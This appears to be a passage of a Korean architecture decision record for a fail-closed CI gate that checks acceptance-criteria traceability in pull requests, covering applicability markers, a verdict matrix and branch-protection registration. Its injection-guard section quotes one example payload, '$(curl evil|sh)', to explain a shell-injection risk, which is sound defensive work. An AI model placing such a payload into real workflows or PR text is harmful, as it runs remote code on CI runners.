- ∴ "비적용 PR → in-job exit 0" 은 §결정4 위반이 아니다. **exception-through-interpretation 봉인**: 두 판정은 순차 직교이며 서로 약화하지 않는다.

**(B) per-PR applicability 축 = 신호 C (기존 2 축과 disjoint)**:
- 본 프로젝트 applicability 3 축: (a) consumer-배포 applicability(ADR-130 positive-whitelist) · (b) repo-level applicability(§결정3 F1 repo-guard `if: github.repository ==`) · **(c) per-PR applicability = 본 Amendment 신설**.
- **신호 C = resolved authoritative §5 에 ≥1 normative AC presence**. positive detection(선언 표면 *있음* 탐지 — self-declared opt-out 플래그·label 토글·diff-touch 금지, 신호 A/D/E/F 기각) + presence-based(semantic 판단 금지, §결정1 천장 상속).
- **비적용 positive 확정 = resolve-success ∧ 0 normative AC**(authoritative 소스 clean-parse 후 normative AC 0). 두 clean 경로: (i) §5 AC 선언 표면 구조적 부재(§5 없음 또는 §5 에 AC 표 없음) (ii) §5 AC 표 present + records well-formed + 0 normative(전부 declared/advisory).

**(C) I-APPLIC 불변식 codify (신규 — §2.4 Story)** — applicability 신호 = objective ∧ non-suppressible ∧ 판정불가≠비적용 ∧ forward-only/grandfather:
- **판정불가 ≠ 비적용 (최중요, anti-degradation)**: cross-repo fetch 실패 / 403 / 404 / frontmatter-parse 실패 / local-unreadable / §5 malformed-table = **판정불가 → FAIL**(§결정4 helper fail-closed 재사용). 어떤 degraded 경로도 "비적용 skip"으로 흡수 금지(born-hollow 봉인). **anti-degradation guard**: §5 에 AC-ID 형 토큰(`AC-\d+`)이 present 인데 parseable AC 표 부재 = 산문 AC 선언 + 표 파손 = degradation → FAIL(skip 금지). 비적용 skip 은 (AC 표 부재 ∧ AC-ID 토큰 부재)의 positive 부재에서만 도달.
- **non-suppressible**: 적용 PR 이 억제가능 신호(story_uri 마커 삭제·label)로 비적용 위장 불가 — story_uri 마커 삭제 = 판정불가 FAIL(adapter `if(!storyUri) fail`). resolved §5 를 비게 하려면 authoritative Story §5 물리삭제 필요(고가시 + RO-1 §1↔§5 완결성 포착 + tier 배정 RO-1 gate).
- **empty-AC bypass 무손상**: §5 AC 표 present + 0 rows = F-AC7-a bypass(선언 표면 구축 후 비움) → FAIL 절대 재개방 금지. "AC 표 부재(비적용)" vs "AC 표 present + 0 rows(bypass)" 구조적 구분.
- **forward-only + grandfather**: 등록은 향후 PR 강제 — G3~G6 기머지 PR 소급 재검증 아님(Story date/KEY 기준).

**(D) 단일 판별 모델 = phase × resolve-outcome 매트릭스** (§1.1 §5-absence + §1.2 Phase-1 rtm_uri + §1.3 story_uri verify 를 개별 패치 금지 — 단일 모델로 통합). 적용성 verdict = **core 단일 소유**(adapter 재파싱 = drift 금지):

| resolve outcome | phase 1 | phase 2 |
|---|---|---|
| 판정불가(fetch/403/404/frontmatter/unreadable/malformed-table) | FAIL | FAIL |
| 비적용(AC 표 부재 ∧ AC-ID 토큰 부재; 또는 records present·0 normative) | PASS(exit 0) | PASS(exit 0) |
| empty-AC(표 present, 0 rows) | FAIL(F-AC7-a) | FAIL(F-AC7-a) |
| 적용, rtm_uri 부재(RTM not-yet) | Hop1 only(Hop2 skip) | FAIL(RTM 필수) |
| 적용, rtm=placeholder/absent | FAIL(F-AC7-b/b2) | FAIL |
| 적용, rtm resolved | Hop1+Hop2 | Hop1+Hop2+Hop3 |

- **rtm_uri Phase-1 not-yet (§1.2)**: Phase-1 PR(§1-7)은 §8 RTM 이 아직 산출물 아님 — rtm_uri 마커 부재 = not-yet-applicable → Hop1 only(placeholder fallback false-fail 제거). placeholder(§8 "작성 예정")로의 *fallback* 은 금지(F-AC7-b2 = FAIL). not-yet 은 adapter 의 EXPLICIT 신호(rtm_uri 마커 부재 ∧ phase 1)이지 placeholder 흡수 아님.

**(E) in-job 판정 (F-1/F-2/F-3 GitHub 플랫폼 제약)**: required + workflow-skip = 영구 Pending → merge 차단(GitHub Docs verified). ∴ 적용성 가드 = **항상 실행 in-job 판정 + exit code**. job-level `if:` skip(runner 배정 前 server 평가 = disk 부재, hashFiles/steps context 부적격) / `on.pull_request.paths` 필터(required-pending 함정) **금지**. trigger 는 `pull_request`(paths 필터 없음) 유지, 분기는 in-job. 비적용 PR 도 checkout + in-job exit 0(job-skip 아님).

**(F) story_uri 영구 ref (§1.3 — 404 3-class)**: story_uri = **영구 ref(internal-docs main / immutable commit SHA)**, transient feature 브랜치 ref 금지(Class A 404 회피). 404 는 단일원인 처리 금지 — auth-masking(403→404 masking, F-5 GitHub Docs) vs genuine ref-missing 구분, **둘 다 판정불가 FAIL**(skip 흡수 금지). false-fail 은 영구-ref *convention* 으로 예방(404 흡수 아님). frontmatter-parse 실패(Class B)=post-fetch 판정불가 FAIL(root-cause = 영구 ref 실 frontmatter resolve).

**(G) 6→7 required 등록 reconcile 완결 (§결정3 HELD 해제)**:
- **ground-truth**: doc SSOT(CLAUDE.md 브랜치 보호 표 + branch-protection-audit)=7-tuple(`ac-traceability-matrix` 포함, doc-ahead) ↔ live(gh api)=6-tuple. reconcile = **live 를 doc 로 승격**(6→7 live 등록) — doc 표 무변경.
- **ordering invariant (§결정3 상속)**: workflow 착륙 → self-test suite green(`ac-traceability-self-test.yml`) → CFP-2609 own-PR green(적용성 가드 실 red/green 산출) → THEN 등록. own-PR green 미달 시 등록 보류 후 통보.
- **등록 실행 = Orchestrator post-merge gh api**: POST `/branches/main/protection/required_status_checks/contexts` append(권장, F-4 저위험) 또는 GET→full-PUT 6-보존 replace. 사후 GET `/protection` 로 정확히 7개(기존 6 전부 잔존 + `ac-traceability-matrix`) 실측(AC-9). 등록 *act* = human/Orchestrator gate(forged machine test 금지, AC-8) / doc↔live parity = 기계검증 outcome(AC-9 `test_seven_tuple_preserves_six`).

**(H) 정직 천장 (disclosed ceiling 상속)**: 적용성 신호 = presence-based. 게이트가 "이 PR 이 마땅히 AC 를 가졌어야 하는가"(semantic)를 판정하지 않는다 — non-gameability 는 신호 C + RO-1(§1↔§5 완결성·tier 배정) + AC-10 advisory + Codex divergence defense-in-depth 로 저감(gate-internal semantic 강제 = 검사연극 §결정1 금지). AC-0 under-minting gaming = §결정1(b) Hop0 기인정 disclosed ceiling — CFP-2609 신규 확대 아님. "완전 봉인" hard-claim 금지.

**불변 무손상**: fail-closed 핵심(적용-미추적 = FAIL, §결정4 AC-7) + F1 wrapper-self repo-guard(consumer 오탐 0) + F-AC7-a 빈-AC FAIL + presence/mapping 천장(§결정1) + `AC_ID_RE` sub-letter(§결정4) 전부 무손상. 본 Amendment = scope 정정(false-red 제거)이지 검출력 약화 아님(evidence-gated ratchet ↑ 방향, ADR-064/058/102).

### 결정 9 — non-applicable 선언 경로 (story_uri-absent applicability-scoping) + Option B core-소화 + non-suppressible re-scope (Amendment 2, CFP-2634)

**배경 (firsthand origin/main 실측, blob 어댑터 8296eb70 / core 992f4070)**: §결정8(신호 C = resolved authoritative §5 normative-AC presence)은 위장 검출을 위해 core 가 Story 를 fetch 하고, fetch 는 story_uri 마커를 요구한다. ∴ §결정8 은 **모든 PR 이 story_uri 를 보유**함을 암묵 가정했다. 실측상 story_uri hygiene 은 비균일 — 정당한 무-AC governance PR(marketplace sync / Epic close / sibling parity / §5 AC 미선언)이 story_uri 를 갖지 않는다. 어댑터 `.github/workflows/ac-traceability-matrix.yml` L82-83 `if (!storyUriMatch) { fail('story_uri marker 부재'); return; }` = core 의 적용성 로직 도달 **이전** premature hard-fail → story_uri 없는 정상 비적용 PR 전부 오차단(false-red). CFP-2609 등록 직전 canary(#2617 = CFP-2613 Phase-1 설계 PR, MERGED, story_uri 부재)가 이 결함을 실측 포착 → rollback. **결함의 정확한 위치 = "적용성 verdict = core 단일소유"(§결정8 D)를 어댑터의 marker-presence 선판정이 찬탈(usurp)** 하는 지점. core 는 이미 옳다(`classify_ac_source` NO_AC_SURFACE → 비적용 PASS 소화 shipped).

**A2-5 판정 (Amendment vs 신규 ADR — §결정8 A2-5 구조 답습, 양 prong 반증) = Amendment 2 (ADR-145 무supersede)**:
- **Amendment prong = 채택**: 신규 mechanism 0 — 신규 workflow 0(기존 `ac-traceability-matrix.yml`/core 수정), 신규 required context 0(§결정3/§결정8 이 이미 선언한 동일 6→7), 신규 게이트/카테고리 0, 신규 계약 schema 0(`ac_applicability: none` = PR-body 마커, 계약 필드 아님). `ac_applicability: none` 마커는 §결정8 이 이미 도입한 story_uri / rtm_uri 와 **동class 의 adapter-routed INPUT 마커** — additive, 기존 per-PR applicability mechanism 내부 story_uri-absent 하위case 정련. core 의 `--rtm-not-yet`("adapter EXPLICIT 신호 → core decides") 패턴의 **isomorphic 확장**(신규 verdict-owner 도입 0).
- **신규 ADR prong = 기각**: Epic "게이트 G당 1 신규 ADR" 패턴은 *신규 게이트 G* 한정. CFP-2634 = G1(ADR-145) 자신의 story_uri-absent 정련 + 등록 완결 carrier, 신규 게이트 0 → 새 G 슬롯 아님. ADR-133 atomic-claim 신규 번호 소요 0.

**(A) (a) non-applicable 선언 경로 채택 ((b') story_uri 보편 강제 기각)**:
- PR 이 `story_uri:` **OR** 명시 `ac_applicability: none — <비어있지 않은 사유>` 중 하나 보유 → 검사 진행(story_uri) 또는 비적용 PASS(none); **둘 다 부재 = FAIL**(억제-불가 fail-closed 보존).
- (b') 기각 근거: 진짜 AC-표면-없는 변경(marketplace sync 등)에 강제할 story_uri 가 semantically 부재 — fictional 앵커 강제 = "진짜 무-AC 변경 미처리". blast radius 큼(모든 PR-flow story_uri 강제 + 소급 hygiene sweep, §OOS 위반). (a) 는 그 클래스를 auditable 하게 직접 모델(applicability-scoping 정직 도메인 모델).

**(B) 마커 = INPUT(저자선언) — applicability-scoping 프레임으로만 화해 (opt-out 금지)**:
- 마커는 기계적으로 **INPUT**(저자가 core 평가 이전에 PR body 에 기재, core 가 되쓰지 않음). story_uri 부재 시 fetch 할 Story 부재 → `classify_ac_source` 미실행 → core 가 emit 할 OUTPUT 없음. ∴ "core-emit OUTPUT(신호 C 결과)" 프레임은 story_uri-absent(load-bearing) case 에 **적용 불가** — 정직하게 INPUT.
- 신호 A/D/E/F 기각(§결정8 B)과의 결정적 차이: 기각 신호는 **적용 대상 PR(신호 C 보유)의 검사 억제**를 허용했다. `ac_applicability: none` 은 precedence guard 하에서 그것을 못 한다 — 신호 C 획득 가능(story_uri present)하면 core verdict 가 이기고 마커는 inert. 마커는 **신호 C 가 정의상 부재한 story_uri-absent 영역에서만** 권한을 갖는다(정의역 밖 positive N/A = applicability-scoping).
- **opt-out 프레이밍 금지**: "적용 PR 이 검사 회피"(opt-out) 프레임은 §결정4 AC-7 정면 위반. 반드시 "추적할 AC 자체가 없는 정의역 밖"(applicability-scoping) + disclosed residual 프레임.

**(C) Option B core-소화 (어댑터 = thin router, 적용성 verdict = core 단일소유)**:
- 옳은 수정 = 어댑터의 premature verdict **제거**(thin router)이지 **두 번째 verdict 추가 아님**(어댑터가 none 마커 보고 short-circuit PASS 렌더 = 방금 진단한 usurp 죄 재범 = Option A 기각).
- 어댑터 = 마커 **추출·forward 만**: (i) story_uri present → fetch → `--ac-source <story>` (ii) `ac_applicability: none` present → `--ac-applicability-none --none-reason "<reason>"` (reason 빈 문자열도 그대로 forward — 검증은 core) (iii) 두 마커 동시 present → **양쪽 다 forward**(precedence 는 core arbitrate).
- core = precedence·검증 **단일 소유**(신규 EXPLICIT flag `--ac-applicability-none` + `--none-reason`, `--ac-source` required→optional 완화 — `--rtm default=None`+`--rtm-not-yet` 조건부강제 precedent 재사용). `classify_ac_source` 위장 검출(SURFACE_PRESENT+normative)은 **재사용**(신규 위장 로직 0). thin wrapper `.sh`(passthrough) = 자동 forward(코드변경 불요).
- **exit-code 계약 (fail-closed 무손상)**: 신규 FAIL 경로(none-무사유 / 둘다부재 / none-위장)는 core `run()`-level `EXIT_FAIL`(1) + `_error` sentinel(`ac-traceability-matrix`) 로 렌더 — argparse 거부(exit2) 아님(distinct-marker self-test 정합). `--ac-source` optional 완화의 실패모드(ambiguous invocation → silent default-PASS) 방어 = run() 이 4 flag 조합을 **전수 explicit 커버 + fall-through default-FAIL**(sentinel). **둘다부재는 별도 fail-closed default guard**(reason-guard 와 distinct — 어댑터가 `--none-reason ""` 합성 라우팅 금지, 마커 0개 → 두 flag 모두 미전달 → core default-FAIL).

**(D) I-APPLIC non-suppressible re-scope + disclosed residual (silent 약화 금지)**:
- §결정8(C) non-suppressible 원문 = "story_uri 마커 삭제 = 판정불가 FAIL". (a) 채택 시 story_uri 삭제가 none-path 로 PASS 가능해져 이 속성이 **약화** — 이 절을 재조정하지 않으면 코드가 더는 제공 못 하는 속성을 doc 이 단언하는 **born-hollow invariant**(ADR-119 ground-truth 위반 = 게이트가 자기 자신에게 검사연극). ∴ 정직 re-scope:
  - **기계강제 잔존(재조정된 non-suppressible)**: story_uri present + none + normative-AC → FAIL(위장 봉인) / story_uri present + normative-AC → 검사(신호 C 승, 마커 inert) / 둘다부재 → FAIL / none-마커 + 사유 부재·공백 → FAIL. ⟹ **"story_uri 를 지닌 어떤 PR 에 대해서도 억제 불가"**(non-suppressible **conditional on story_uri presence**).
  - **review 저감(인간 이관)**: none-only(story_uri 부재 + none 마커) — 사유 auditable, CODEOWNERS/RO-1 이 사유 심사. 게이트는 선언을 신뢰하되 선언은 로그·인간검토 대상.
  - **disclosed residual(봉인 안 됨)**: 진짜 적용 Story 보유 저자가 story_uri 누락 + none-only + 그럴듯한 사유 → 게이트 검출 불가(fetch 대상 부재). **disclosed·review-완화·emit-축소(b) — sealed 아님. "spoof-proof"/"완전 봉인" hard-claim 금지**(§결정1(b)/§결정8(H) disclosed-ceiling 상속). 위장 검출은 **story_uri-present 영역의 구조적 위장(normative-AC presence)만** 봉인 — semantic 위장(그럴듯한 무의미 사유)·none-only 누락은 봉인 불가(review/CODEOWNERS mitigate).
- emit-wiring(b): 자동 flow(story-init)가 story_uri **영구-ref**(internal-docs main / immutable commit SHA — transient feature ref 금지, §결정8 F Class A 404 회피) 자동 emit → "정당한 story_uri-부재" 모집단 축소(잔여 저감, 제거 아님).

**(E) §결정8(D) 매트릭스 story_uri-absent 행 append** (매트릭스가 story_uri 존재 암묵 가정 → 명문화):

| resolve outcome | phase 1 | phase 2 |
|---|---|---|
| **story_uri 부재 ∧ `ac_applicability: none` ∧ 사유 non-empty** | PASS(exit 0, 비적용 선언) | PASS(exit 0) |
| **story_uri 부재 ∧ `ac_applicability: none` ∧ 사유 부재/공백** | FAIL(AC-2 auditability) | FAIL |
| **story_uri 부재 ∧ none 마커 부재 (둘다부재)** | FAIL(fail-closed no-optout, distinct default guard) | FAIL |
| **story_uri present ∧ none 마커 ∧ 해소 §5 normative-AC ≥1** | FAIL(none-위장, surface overrides none) | FAIL |
| **story_uri present ∧ none 마커 ∧ 0 normative(NO_AC_SURFACE/advonly)** | PASS(병존-무해, none 과 일관) | PASS |

(기존 story_uri-present 행 §결정8 D 무변경 잔존.)

**(F) §결정8(G)/Amendment 1 결과문 정정 (hold→완결 상태 전이)**: §결정8(G)/Amendment 1 결과의 "reconcile 후 live=doc=7-tuple 완결" = 과잉선언(canary rollback 후 live=6-tuple 잔존, 결과문만 미반영 doc-ahead). 정정된 상태 = "reconcile **HELD**(CFP-2609 canary 결함 포착), live=6-tuple". Amendment 2 = 결함 선수정((a)(b)) + genuine 비적용 canary 실증 후 CFP-2634 Phase-2 등록 시점에 **hold→완결** 전이. 등록 미실행 상태에서 doc-ahead(CLAUDE.md 7-tuple)는 유지(정합 목표).

**(G) reason free-text injection 가드 (신규 공격면 — SecurityArch 발견)**: 저자 제어 free-text 사유가 `${{ }}` 로 `run:` step 에 보간되면 shell script injection(`ac_applicability: none — $(curl evil|sh)`). 가드: 사유는 (i) github-script JS 내부에서만 파싱·non-empty 검사, (ii) shell `run:` 에 `${{ steps.*.outputs.reason }}` 보간 **금지** — 필요 시 env(`PHASE`/`RTM_NOT_YET` 기존 방식)로 넘겨 `"$VAR"` 참조, (iii) 이상적으로 사유를 shell 미전달·verdict(PASS/FAIL) boolean 만 넘기고 사유는 JS `_notice` 로깅. [source: GitHub Docs — Script injections / GitHub Security Lab — Untrusted input]. fetch 층 secret masking(Authorization header-only, 응답본문·토큰 로그 금지)은 none-branch 가 fetch 이전 실행(story_uri 부재→fetch 불요)이므로 **무손상**.

**(H) 6→7 등록 ordering invariant (비가역 경계)**: (a)(b) merge + **genuine 비적용 no-story_uri canary**(synthetic fixture 대체 금지 — real PR 이 실제 in-job PASS 실측) → THEN 등록 + **즉시 GET == 정확히 7-tuple**. 등록 前 6-tuple capture(rollback-ready). 등록 실행 = **POST `/branches/main/protection/required_status_checks/contexts` append 권장**(기존 6 무손상; full-PUT replace 는 6 중 drop 위험) 또는 GET→full-PUT+6-보존 명시. 등록 *act* = human/Orchestrator gate(**forged machine-test 금지** — 워크플로 실행라인 self-register 금지, chicken-egg 차단 = Elevation 봉인). doc↔live parity 만 기계검증(post-register GET). canary=availability(정상 PR born-broken block 안 함) / mutation-kill self-test(AC-8)=integrity(false-green 아님) — 비가역 flip 전 둘 다 필수(CFP-2609 교훈: 3 review lane PASS + self-test green 만으론 부족).

**불변 무손상**: fail-closed 핵심(적용-미추적=FAIL, §결정4 AC-7) + F1 wrapper-self repo-guard + F-AC7-a 빈-AC FAIL + presence/mapping 천장(§결정1) + `AC_ID_RE` sub-letter(§결정4) + 적용성 verdict core 단일소유(§결정8 D) + I-APPLIC anti-degradation(판정불가≠비적용, §결정8 C/F) 전부 무손상. 본 Amendment = story_uri-absent scope 정정(false-red 제거) + 신설 residual 명시 disclose 이지 검출력 silent 약화 아님(evidence-gated ratchet↑).

## 대안 (기각 근거)

- **계약 count 제거 → AC-list (MAJOR v2.0)**: 새 ADR + 양-plugin bump + migration 필요 = double-ADR + 파괴적. → 기각, additive MINOR(count 보존, §결정 6) 채택.
- **phase-gate-mergeable.yml in-line 흡수**: warning-tier 또는 fast-pass bypass 로 fail-closed 불가(§결정 3 실측). → 기각, 신규 required job.
- **born-missing = file∧function grep**: CFP-2545 false-oracle(§결정 5). → 기각, ast symbol resolve.
- **skip-toggle 신설**: ADR-127/AC-7 opt-out. → 기각(§결정 4).
- **branch-protection 등록 = (B) shadow-required 하이브리드**(workflow day-1 hard-fail 로 실 red/green + PR red X, `required_contexts` 등록은 지속 green + born-broken-clear 확인 후 ADR-060 §결정6/19 evidence-gate 로 승격): **고려됐으나 미채택** — 사용자가 (A) 즉시 required 를 선택(2026-07-11). 채택 근거 = A 의 born-broken 위험이 게이트 self-test merge-precondition 으로 이미 구조적 차단되어(§결정 3) shadow 유예의 이득이 낮고, 즉시 fail-closed 가 요건-현실 갭 차단(Story 목적)에 직결. B 는 양안 보존 기록으로만 잔존.
- **(Amendment 1) CFP-2609 = 신규 ADR(per-PR applicability 축 신설)**: per-PR applicability 가 "어디에도 정의 없는 세 번째 축"이므로 신규 ADR 도 고려됐으나 **기각** — A2-5 양 prong(§결정 8) 반증: 신규 mechanism(workflow/스키마/게이트/context) 0 + Epic "게이트 G당 1 ADR" 패턴은 신규 게이트에만 적용(CFP-2609=G1 완결 carrier, ADR-152 가 G3 로 152 점유하므로 신규 게이트 slot 아님). → ADR-145 Amendment(§결정4 정의역 명확화 + §결정3 등록 완결) 채택.
- **(Amendment 1) 적용성 = job-level `if:` / `on.paths` skip**: required + workflow-skip = 영구 Pending → merge 차단(F-1 GitHub Docs) + job-level `if:` = disk 부재로 계산 불가(F-2). → 기각, in-job exit-code 판정(§결정 8 E).
- **(Amendment 1) 적용성 신호 = story_uri 마커(A) / Epic·sibling label(E) / diff src touch(D)**: A/E = 억제가능 opt-out 벡터(§결정3 fast-pass bypass 재유입), D = §결정2 diff-추론 금지 위반. → 기각, 신호 C(resolved §5 normative-AC presence, non-suppressible, §결정 8 B).
- **(Amendment 2) (b') story_uri 보편성 전면 강제**(모든 PR-flow story_uri emit 의무 + 기존 hygiene gap 전수 소급 정정): non-suppressible 완전 보존 + 위장 완전 검출 + none-only 잔여 자체 소거로 구조적으로 가장 깨끗하나 — 진짜 AC-표면-없는 변경(marketplace sync 등)에 fictional 앵커 강제 + 모든 governance PR 고마찰 + 소급 정정 = blast radius 큼(§OOS 위반). → 기각, (a) non-applicable 선언 경로(applicability-scoping 정직 모델 + disclosed residual, §결정 9 A). 보안순위 (b')>(a)+guard+disclose 는 인정하되 (a) 채택 시 residual 명시 disclose 로 완화.
- **(Amendment 2) Option A 어댑터 short-circuit**(어댑터가 none 마커 보고 곧장 PASS 렌더, core 무변경): §결정8(D) 적용성 verdict core 단일소유 찬탈 죄 **재범**(방금 진단한 어댑터-verdict 결함 재도입) + 신규 verdict 로직이 어댑터 JS 에 → self-test 하네스가 core Python 만 mutation-변조하므로 **실행-backed 테스트 0 + mutation-kill 불가 = born-hollow**(TestContract QA verdict) + free-text 사유가 shell 경계 근접 → injection 표면↑. → 기각, Option B core-소화(§결정 9 C).

## 결과

- 사용자 요건이 AC-ID 로 민팅되면 요구사항→설계→§8→구현 사슬에서 침묵 삭제가 구조적으로 불가능(presence/mapping fail-closed). 미민팅(Hop0)은 RO-1 review + advisory 로 defense-in-depth.
- traceability rot·수동오류 저감 + semantic 잔여 2건 정직 공개 = ADR-119/ADR-006 Amd2 정합(검사연극 회피).
- Epic CFP-2602 게이트 disjoint: G1(AC↔명명 §8 테스트 ∧ diff 실재) ⊥ G2(runtime liveness) ⊥ G3(discriminating 행사). 공유 = 원리(선언→실행, Epic #2346 계보)뿐.

### Amendment 1 결과 (CFP-2609)

- **적용성 3 축 확립**: (a) consumer-배포(ADR-130) ⊥ (b) repo-level(F1 repo-guard) ⊥ (c) per-PR(신호 C) — 게이트가 정의역 밖 PR(추적할 AC 부재)을 false-red 로 오차단하지 않으면서 fail-closed 핵심(적용-미추적=FAIL)을 무손상 보존. false-red 제거(scope 정정)이지 검출력 약화 아님.
- **doc-vs-live divergence 해소**: §결정3 이 선언한 6→7 등록의 미완결분이 CFP-2609 로 완결(ordering invariant 준수 post-merge Orchestrator gh api). ADR-151 이 기록한 "CFP-2609 reconcile 대기" 항목 해소 — reconcile 후 live=doc=7-tuple.
- **born-hollow 봉인 강화**: I-APPLIC anti-degradation(판정불가·degraded 경로의 skip 흡수 금지) + self-test 3경로 discriminating mutant(비적용→PASS / 적용-미추적→FAIL / empty-AC→FAIL)로 게이트가 빈 껍데기화하지 않음을 merge-precondition 으로 강제(CFP-2530/2535 계보).

### Amendment 2 결과 (CFP-2634)

- **story_uri-absent false-red 제거**: 정당한 무-AC governance PR(marketplace sync / Epic close / sibling / §5 AC 미선언)이 story_uri 부재로 오차단되던 결함 해소 — 어댑터 premature hard-fail 제거(thin router) + `ac_applicability: none — <사유>` applicability-scoping 경로. 적용성 verdict core 단일소유(§결정8 D) 무손상. fail-closed 핵심(둘다부재=FAIL, none-위장=FAIL, none-무사유=FAIL) 보존.
- **non-suppressibility 정직 re-scope**: "story_uri 삭제=FAIL" → "non-suppressible **conditional on story_uri presence** + none-only residual **disclosed**"(silent 약화 아닌 명문 disclose). born-hollow invariant(코드 미제공 속성 doc 단언) 회피 — ADR-119 ground-truth 정합. "완전 봉인" hard-claim 금지(disclosed-ceiling 상속).
- **6→7 등록 완결 (hold→완결)**: §결정8(G)/Amendment 1 결과 과잉선언(live=doc=7-tuple) 정정 → (a)(b) 선수정 + genuine 비적용 canary 실증 후 CFP-2634 Phase-2 등록 시점 완결. live=6-tuple(HELD) → live=7-tuple(완결) 상태 전이. doc(CLAUDE.md 7-tuple)↔live drift 해소. ADR-151 "CFP-2609 reconcile 대기" → CFP-2634 완결.
- **신규 injection 가드**: 저자 free-text 사유 → env-var 전달(JS-confined 파싱), `${{ }}`→`run:` 보간 금지(shell script injection 봉인).
- **born-hollow 봉인 유지**: none-경로 verdict = core Python 결정라인(Option B) → mutation-kill 3종(none-무사유→FAIL / none-위장→FAIL / 둘다부재→FAIL, 각 distinct guard) + 비적용→PASS reachability + genuine canary 로 merge-precondition 강제(CFP-2530/2535 계보).

## 관련 파일

- Story: `<internal-docs>/wrapper/stories/CFP-2603.md` (§7 설계 서사) · **(Amd1)** `<internal-docs>/wrapper/stories/CFP-2609.md` (§7 적용성 가드 설계 서사) · **(Amd2)** `<internal-docs>/wrapper/stories/CFP-2634.md` (§7 non-applicable 선언 경로 설계 서사)
- Change Plan: `<internal-docs>/wrapper/change-plans/cfp-2603-g1-ac-traceability-matrix.md` · **(Amd1)** `<internal-docs>/wrapper/change-plans/cfp-2609-g1-applicability-guard-required-registration.md` · **(Amd2)** `<internal-docs>/wrapper/change-plans/cfp-2634-ac-traceability-nonapplicable.md`
- **(Amd2) 수정(Phase 2)**: `scripts/lib/check_ac_traceability_matrix.py`(신규 `--ac-applicability-none`/`--none-reason` flag + none-declaration 경로 + story_uri-present precedence(surface overrides none) + `--ac-source` optional 완화 + 둘다부재 distinct fail-closed default guard, verdict 전부 core-owned) · `.github/workflows/ac-traceability-matrix.yml`(어댑터 = thin router: story_uri-absent 시 premature hard-fail 제거 + `ac_applicability: none` 마커 추출·forward + reason env-var 전달(injection 가드)) · `templates/github-workflows/ac-traceability-matrix.yml`(L2 byte-identical) · `.github/workflows/story-init.yml`(Phase-1 PR body story_uri 영구-ref(immutable commit SHA) emit, AC-4) · `tests/scripts/test_ac_nonapplicable_declaration.py`(신규 CFP-2634 AC-1a..AC-12 named-test — 기존 CFP-2609 named-test 파일 미확장) · `tests/scripts/test_check-ac-traceability-matrix.sh`+`_ac_matrix_fixtures.py`(F-NONE-* fixture + Mutation-{NONE-REASON,SPOOF,BOTHABSENT} 3종 append + `run_gate_none` helper)
- **(Amd2) 코드-외 조치(Phase 2 post-merge)**: 6→7 등록(POST append 권장) — (a)(b) merge + genuine 비적용 no-story_uri canary 실증 후 Orchestrator gh api, 즉시 GET 7-tuple 실측 + rollback-ready
- 신규(Phase 2): `scripts/lib/ac_id.py` · `scripts/lib/check_ac_traceability_matrix.py` · `scripts/check-ac-traceability-matrix.sh` · `.github/workflows/ac-traceability-matrix.yml`
- **(Amd1) 수정(Phase 2)**: `scripts/lib/check_ac_traceability_matrix.py`(적용성 verdict core 단일 소유 — `run()` phase×resolve-outcome 매트릭스) · `.github/workflows/ac-traceability-matrix.yml`(story_uri 영구 ref + rtm_uri not-yet + 404 3-class) · `tests/scripts/test_check-ac-traceability-matrix.sh`(적용성 3경로 discriminating mutant) · `templates/github-workflows/ac-traceability-matrix.yml`(L2 byte-identical)
- **(Amd1) 코드-외 조치(Phase 2 post-merge)**: branch-protection `required_status_checks` 6→7-tuple 등록(Orchestrator gh api, ordering invariant 준수 + 사후 GET 7-tuple 실측)
- 계약(Phase 2): `docs/inter-plugin-contracts/requirements-output-v1.md`(v1.2) · `design-output-v2.md`(v2.5) · `MANIFEST.yaml`
- review binding(Phase 2): `plugins/codeforge-review/templates/review-checklists/requirements.md` · `plugins/codeforge-review/agents/RequirementsReviewPLAgent.md` · `codeforge:review-responsibility` matrix
- 선례: `scripts/lib/check_venue_shape_fidelity_presence.py`(near-exact 구조 선례, warning-tier → 본 게이트는 fail-closed 상향)
